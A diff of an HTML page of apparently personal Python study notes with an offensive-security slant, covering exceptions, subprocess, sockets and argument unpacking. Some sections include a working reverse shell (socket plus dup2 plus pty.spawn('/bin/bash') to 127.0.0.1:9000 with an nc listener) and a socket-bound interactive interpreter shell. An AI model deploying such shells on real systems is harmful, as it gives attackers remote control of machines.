+... 	print("Some other exception occured " + str(e))
 ... 
 dude, you can't divide by zero
 </code></pre>
 <h4 id="tryexceptelse"><a class="header" href="#tryexceptelse">try/except/else</a></h4>
 <pre><code class="language-python"># try to open url that does not exist
 &gt;&gt;&gt; try:
-...     urllib.request.urlopen(&quot;http://doesntexist.tgt&quot;)
+...     urllib.request.urlopen("http://doesntexist.tgt")
 # specific exception handler
 ... except urllib.error.URLError:
-...     print(&quot;That URL doesn't exist&quot;)
+...     print("That URL doesn't exist")
 ...     sys.exit(2)
 # generic exception handler
 ... except Exception as e:
-...     print(f&quot;{str(e)} occured&quot;)
+...     print(f"{str(e)} occured")
 # do this if it worked
 ... else:
-...     print(&quot;success without error&quot;)
+...     print("success without error")
 # do this whether it worked or not
 ... finally:
-...     print(&quot;always do this&quot;)
+...     print("always do this")
 </code></pre>
 <h4 id="try-until-it-works"><a class="header" href="#try-until-it-works">Try until it works!</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; while True:
@@ -2199,7 +2438,7 @@ dude, you can't divide by zero
 </code></pre>
 <h3 id="process-execution"><a class="header" href="#process-execution">Process Execution</a></h3>
 <h4 id="interacting-with-subprocesses"><a class="header" href="#interacting-with-subprocesses">Interacting with Subprocesses</a></h4>
-<pre><code class="language-python">&gt;&gt;&gt; processhandle = subprocess.Popen(&quot;run this command&quot;,
+<pre><code class="language-python">&gt;&gt;&gt; processhandle = subprocess.Popen("run this command",
 ...     shell = True,
 ...     stdout = subprocess.PIPE,
 ...     stderr = subprocess.PIPE,
@@ -2209,7 +2448,7 @@ dude, you can't divide by zero
 </code></pre>
 <h4 id="capturing-process-execution"><a class="header" href="#capturing-process-execution">Capturing Process Execution</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; import subprocess
-&gt;&gt;&gt; proc = subprocess.Popen(&quot;ls -l&quot;, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+&gt;&gt;&gt; proc = subprocess.Popen("ls -l", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
 &gt;&gt;&gt; exit_code = proc.wait()
 # waits until it finishes and capture the exit code
 &gt;&gt;&gt; results = proc.stdout.read()
@@ -2219,19 +2458,19 @@ b'insgesamt 60\ndrwxrwxr-x  5 d41y d41y 4096 Jun  3 17:27 abschlussuebung\ndrwxr
 </code></pre>
 <h4 id="popenwait-buffers-and-popencommunicate"><a class="header" href="#popenwait-buffers-and-popencommunicate">Popen.wait(), Buffers, and Popen.communicate()</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; from subprocess import Popen, PIPE
-&gt;&gt;&gt; ph = Popen(&quot;ls -laR /&quot;, shell=True, stdin=PIPE, stderr=PIPE, stdout=PIPE)
+&gt;&gt;&gt; ph = Popen("ls -laR /", shell=True, stdin=PIPE, stderr=PIPE, stdout=PIPE)
 &gt;&gt;&gt; ph.wait()
 # wait locks up the program
 # wait only returns after the program is completely finished
 # Popen pauses execution when the stdout read buffer is full
 &gt;&gt;&gt; from subprocess import Popen, PIPE
-&gt;&gt;&gt; ph = Popen(&quot;ls -laR /&quot;, shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
+&gt;&gt;&gt; ph = Popen("ls -laR /", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
 &gt;&gt;&gt; output, errors = ph.communicate()
 # communicate returns a tuple of bytes for both the output and errors
 </code></pre>
 <h4 id="a-simpler-alternative-in-run"><a class="header" href="#a-simpler-alternative-in-run">A simpler Alternative in .run()</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; import subprocess
-&gt;&gt;&gt; result = subprocess.run(&quot;whoami&quot;, shell=True, capture_output=True)
+&gt;&gt;&gt; result = subprocess.run("whoami", shell=True, capture_output=True)
 &gt;&gt;&gt; result.stdout
 b'd41y\n'
 &gt;&gt;&gt; result.
@@ -2243,8 +2482,8 @@ result.check_returncode()  result.stderr
 <pre><code class="language-python"># shell needs to be true
 # otherwise the shell injection won't work
 # you would have to split the command into a list
-ip = input(&quot;What IP shall I ping?&quot;)
-subprocess.run(f&quot;ping -c 1 {ip}&quot;.split(), capture_output=True).stdout
+ip = input("What IP shall I ping?")
+subprocess.run(f"ping -c 1 {ip}".split(), capture_output=True).stdout
 </code></pre>
 <h3 id="creating-a-python-executable"><a class="header" href="#creating-a-python-executable">Creating a Python Executable</a></h3>
 <h4 id="turn-the-py-into-an-exe"><a class="header" href="#turn-the-py-into-an-exe">Turn the .py into an .EXE</a></h4>
@@ -2261,27 +2500,27 @@ subprocess.run(f&quot;ping -c 1 {ip}&quot;.split(), capture_output=True).stdout
 <h4 id="fixed-byte-recvall"><a class="header" href="#fixed-byte-recvall">Fixed-Byte Recvall()</a></h4>
 <pre><code class="language-python"># sender
 &gt;&gt;&gt; def mysendall(thesocket, thedata):
-...     thesocket.send(f&quot;{len(thedata):0&gt;100}&quot;.encode())
+...     thesocket.send(f"{len(thedata):0&gt;100}".encode())
 ...     return thesocket.sendall(thedata)
 # receiver
 &gt;&gt;&gt; def recvall(thesocket):
 ...     datalen = int(thesocket.recv(100))
-...     data = b&quot;&quot;
+...     data = b""
 ...     while len(data)&lt;datalen:
 ...             data += thesocket.recv(4096)
 ...     return data
 </code></pre>
 <h4 id="delimiter-based-recvall"><a class="header" href="#delimiter-based-recvall">Delimiter-Based recvall()</a></h4>
 <pre><code class="language-python"># sender
-&gt;&gt;&gt; def mysendall(thesocket, thedata, delimiter=b&quot;!@#$%^&amp;&quot;):
-...     senddata = codecs.encode(thedata, &quot;base64&quot;) + delimiter
+&gt;&gt;&gt; def mysendall(thesocket, thedata, delimiter=b"!@#$%^&amp;"):
+...     senddata = codecs.encode(thedata, "base64") + delimiter
 ...     return thesocket.sendall(senddata)
 # receiver
-&gt;&gt;&gt; def recvall(thesocket, delimiter=b&quot;!@#$%^&amp;&quot;):
-...     data = b&quot;&quot;
+&gt;&gt;&gt; def recvall(thesocket, delimiter=b"!@#$%^&amp;"):
+...     data = b""
 ...     while not data.endswith(delimiter):
 ...             data += thesocket.recv(4096)
-...     return codecs.decode(data[:-len(delimiter)], &quot;base64&quot;)
+...     return codecs.decode(data[:-len(delimiter)], "base64")
 </code></pre>
 <h4 id="non-blocking-socket"><a class="header" href="#non-blocking-socket">Non-Blocking Socket</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; mysocket.setblocking(0)
@@ -2358,9 +2597,9 @@ subprocess.run(f&quot;ping -c 1 {ip}&quot;.split(), capture_output=True).stdout
 <pre><code class="language-bash">┌──(automated_offense)─(d41y㉿user)-[~]
 └─$ cat writefile.py                                                        
 import sys
-outfile = open(&quot;outfile.txt&quot;, &quot;w&quot;)
+outfile = open("outfile.txt", "w")
 sys.stdout = outfile
-print(&quot;Write this to a file&quot;)
+print("Write this to a file")
 outfile.flush()
 outfile.close()
                                                                                            
@@ -2376,10 +2615,10 @@ Write this to a file
 ┌──(automated_offense)─(d41y㉿user)-[~]
 └─$ cat readfile.py 
 import sys
-infile = open(&quot;outfile.txt&quot;)
+infile = open("outfile.txt")
 sys.stdin = infile
-x = input(&quot;&quot;)
-print(&quot;The file says &quot; + x)
+x = input("")
+print("The file says " + x)
                                                                                            
 ┌──(automated_offense)─(d41y㉿user)-[~]
 └─$ python readfile.py 
@@ -2392,7 +2631,7 @@ The file says Write this to a file
 <h4 id="sockets-are-similar-to-files"><a class="header" href="#sockets-are-similar-to-files">Sockets are similar to Files</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; import sys, socket
 &gt;&gt;&gt; s = socket.socket()
-&gt;&gt;&gt; s.connect((&quot;127.0.0.1&quot;, 9000))
+&gt;&gt;&gt; s.connect(("127.0.0.1", 9000))
 &gt;&gt;&gt; s.fileno()
 3
 &gt;&gt;&gt; sys.stdout.fileno()
@@ -2408,11 +2647,11 @@ The file says Write this to a file
 └─$ cat osdup.py                                                            
 import socket, os, pty
 s = socket.socket()
-s.connect((&quot;127.0.0.1&quot;, 9000))
+s.connect(("127.0.0.1", 9000))
 os.dup2(s.fileno(),0)
 os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
-pty.spawn(&quot;/bin/bash&quot;)
+pty.spawn("/bin/bash")
 </code></pre>
 <pre><code class="language-bash">┌──(d41y㉿user)-[~]
 └─$ sudo nc -lnvp 9000
@@ -2426,22 +2665,22 @@ cd ..
 d41y@user:/home$
 </code></pre>
 <pre><code class="language-python"># alternative last lines in the code
-# subprocess.Popen(([&quot;/bin/sh&quot;, &quot;-i&quot;]))
-# subprocess.call(&quot;/bin/bash&quot;)
+# subprocess.Popen((["/bin/sh", "-i"]))
+# subprocess.call("/bin/bash")
 </code></pre>
 <h4 id="replace-stdout-with-a-socket"><a class="header" href="#replace-stdout-with-a-socket">Replace stdout with a Socket</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; import socket, sys
 &gt;&gt;&gt; s = socket.socket()
 &gt;&gt;&gt; sys.stdout = s
-&gt;&gt;&gt; print(&quot;Hello&quot;)
+&gt;&gt;&gt; print("Hello")
 Traceback (most recent call last):
-  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
+  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
 AttributeError: 'socket' object has no attribute 'write'
 # the socket is missing the .write() method
 &gt;&gt;&gt; sys.stdin = s
 &gt;&gt;&gt; input()
 Traceback (most recent call last):
-  File &quot;&lt;stdin&gt;&quot;, line 1, in &lt;module&gt;
+  File "&lt;stdin&gt;", line 1, in &lt;module&gt;
 AttributeError: 'socket' object has no attribute 'readline'
 # the socket is missing the .readline() method
 </code></pre>
@@ -2449,12 +2688,12 @@ AttributeError: 'socket' object has no attribute 'readline'
 <h4 id="accessing-the-variable"><a class="header" href="#accessing-the-variable">Accessing the variable</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; class NewList(list):
 ...     def sayhi(the_var):
-...             print(&quot;Hello variable &quot;, the_var)
+...             print("Hello variable ", the_var)
 ...     def len(the_var):
 ...             return len(the_var)
 ... 
 &gt;&gt;&gt; x = NewList([1,2,3,4,5,6,7,8])
-&gt;&gt;&gt; y = NewList([&quot;list&quot;, &quot;of&quot;, &quot;strings&quot;])
+&gt;&gt;&gt; y = NewList(["list", "of", "strings"])
 &gt;&gt;&gt; x.sayhi()
 Hello variable  [1, 2, 3, 4, 5, 6, 7, 8]
 &gt;&gt;&gt; y.sayhi()
@@ -2466,7 +2705,7 @@ Hello variable  ['list', 'of', 'strings']
 </code></pre>
 <h4 id="adding-attributes"><a class="header" href="#adding-attributes">Adding Attributes</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; x = NewList([1,2,3])
-&gt;&gt;&gt; x.NAME = &quot;NumberList&quot;
+&gt;&gt;&gt; x.NAME = "NumberList"
 &gt;&gt;&gt; x.NAME
 'NumberList'
 &gt;&gt;&gt; dir(x)
@@ -2477,8 +2716,8 @@ Hello variable  ['list', 'of', 'strings']
 ...     def __init__(self, a_name):
 ...             self.NAME = a_name
 ... 
-&gt;&gt;&gt; x.NewList(&quot;ListOfNumbers&quot;)
-&gt;&gt;&gt; x = NewList(&quot;ListOfNumbers&quot;)
+&gt;&gt;&gt; x.NewList("ListOfNumbers")
+&gt;&gt;&gt; x = NewList("ListOfNumbers")
 &gt;&gt;&gt; x.extend([4,5,6,7])
 &gt;&gt;&gt; x
 [4, 5, 6, 7]
@@ -2493,7 +2732,7 @@ Hello variable  ['list', 'of', 'strings']
 ...             self.NAME = a_name
 ...             super().__init__(parent_stuff)
 ... 
-&gt;&gt;&gt; x = NewList(&quot;ListOfNumber&quot;, [1,2,3,4,5])
+&gt;&gt;&gt; x = NewList("ListOfNumber", [1,2,3,4,5])
 &gt;&gt;&gt; x.NAME
 'ListOfNumber'
 &gt;&gt;&gt; x
@@ -2511,7 +2750,7 @@ Hello variable  ['list', 'of', 'strings']
 <h4 id="unpacking-iterables-with--in-function-call"><a class="header" href="#unpacking-iterables-with--in-function-call">Unpacking Iterables with * in Function Call</a></h4>
 <pre><code class="language-python">&gt;&gt;&gt; print(*[4,5,6])
 4 5 6
-&gt;&gt;&gt; print(*&quot;murr&quot;)
+&gt;&gt;&gt; print(*"murr")
 m u r r
 &gt;&gt;&gt; print([[1,2,3],[4,5,6]])
 [[1, 2, 3], [4, 5, 6]]
@@ -2523,9 +2762,9 @@ m u r r
 <pre><code class="language-python">&gt;&gt;&gt; def example(**named_args):
 ...     print(str(named_args))
 ... 
-&gt;&gt;&gt; example(python=&quot;Rocks&quot;, sec573=&quot;awesome&quot;)
+&gt;&gt;&gt; example(python="Rocks", sec573="awesome")
 {'python': 'Rocks', 'sec573': 'awesome'}
-&gt;&gt;&gt; example(make_a=&quot;dict&quot;, any=&quot;length&quot;, a=1, b=3)
+&gt;&gt;&gt; example(make_a="dict", any="length", a=1, b=3)
 {'make_a': 'dict', 'any': 'length', 'a': 1, 'b': 3}
 # ** in a function definition packs named argument items into a dictionary
 </code></pre>
@@ -2533,9 +2772,9 @@ m u r r
 <pre><code class="language-python">&gt;&gt;&gt; def example(name,address):
 ...     print(name, address)
 ... 
-&gt;&gt;&gt; example(address=&quot;123 street&quot;, name=&quot;Mike Murr&quot;)
+&gt;&gt;&gt; example(address="123 street", name="Mike Murr")
 Mike Murr 123 street
-&gt;&gt;&gt; example(**{&quot;address&quot;:&quot;123 street&quot;, &quot;name&quot;:&quot;Mike Murr&quot;})
+&gt;&gt;&gt; example(**{"address":"123 street", "name":"Mike Murr"})
 Mike Murr 123 street
 # ** in front of a dict when calling a function will unpack the dict
 </code></pre>
@@ -2547,9 +2786,9 @@ Mike Murr 123 street
 () {}
 &gt;&gt;&gt; example(1,2,3,4)
 (1, 2, 3, 4) {}
-&gt;&gt;&gt; example(python=&quot;rocks&quot;, sec573=&quot;Rocks&quot;)
+&gt;&gt;&gt; example(python="rocks", sec573="Rocks")
 () {'python': 'rocks', 'sec573': 'Rocks'}
-&gt;&gt;&gt; example(1,2,3,4, python=&quot;rocks&quot;, sec573=&quot;Rocks&quot;)
+&gt;&gt;&gt; example(1,2,3,4, python="rocks", sec573="Rocks")
 (1, 2, 3, 4) {'python': 'rocks', 'sec573': 'Rocks'}
 # unnamed arguments must be first, named keyword arguments must be last
 </code></pre>
@@ -2559,10 +2798,10 @@ Mike Murr 123 street
 ... 
 &gt;&gt;&gt; call_something(sum, [1,2,3])
 6
-&gt;&gt;&gt; call_something(input, &quot;what is your name? &quot;)
+&gt;&gt;&gt; call_something(input, "what is your name? ")
 what is your name? peter
 'peter'
-&gt;&gt;&gt; list(call_something(zip, [1,2,3],[4,5,6],&quot;a b  c&quot;.split()))
+&gt;&gt;&gt; list(call_something(zip, [1,2,3],[4,5,6],"a b  c".split()))
 [(1, 4, 'a'), (2, 5, 'b'), (3, 6, 'c')]
 # by packing input and unpacking in function calls, you can call any function without knowing its arguments
 </code></pre>
@@ -2580,14 +2819,14 @@ what is your name? peter
 </code></pre>
 <pre><code class="language-python">&gt;&gt;&gt; import socket, sys, code
 &gt;&gt;&gt; s = MySocket(socket.AF_INET, socket.SOCK_STREAM)
-&gt;&gt;&gt; s.connect((&quot;127.0.0.1&quot;, 9000))
+&gt;&gt;&gt; s.connect(("127.0.0.1", 9000))
 &gt;&gt;&gt; sys.stdout = sys.stdin = sys.stderr = s
-&gt;&gt;&gt; code.interact(&quot;BAM!! Shell&quot;, local = locals())
-```&lt;!-- {% embed footer message=&quot;2026 • Created by [d41y](https://github.com/d41y)&quot; %} --&gt;
+&gt;&gt;&gt; code.interact("BAM!! Shell", local = locals())
+```&lt;!-- {% embed footer message="2026 • Created by [d41y](https://github.com/d41y)" %} --&gt;
 
-&lt;div data-embedify data-app=&quot;footer&quot; data-option-message=&quot;2026 • Created by [d41y](https://github.com/d41y)&quot; style=&quot;display:none&quot;&gt;&lt;/div&gt;
+&lt;div data-embedify data-app="footer" data-option-message="2026 • Created by [d41y](https://github.com/d41y)" style="display:none"&gt;&lt;/div&gt;
 
-&lt;style&gt;footer { text-align: center; text-wrap: balance; margin-top: 5rem; display: flex; flex-direction: column; justify-content: center; align-items: center; } footer p { margin: 0; }&lt;/style&gt;&lt;footer&gt;&lt;p&gt;2026 • Created by &lt;a href=&quot;https://github.com/d41y&quot;&gt;d41y&lt;/a&gt;&lt;/p&gt;&lt;/footer&gt;</code></pre>
+&lt;style&gt;footer { text-align: center; text-wrap: balance; margin-top: 5rem; display: flex; flex-direction: column; justify-content: center; align-items: center; } footer p { margin: 0; }&lt;/style&gt;&lt;footer&gt;&lt;p&gt;2026 • Created by &lt;a href="https://github.com/d41y"&gt;d41y&lt;/a&gt;&lt;/p&gt;&lt;/footer&gt;</code></pre>
 
                     </main>
 
@@ -2652,6 +2891,7 @@ what is your name? peter
 
         <!-- Custom JS scripts -->
         <script src="../../../../theme/pagetoc.js"></script>
+
 
 
     </div>
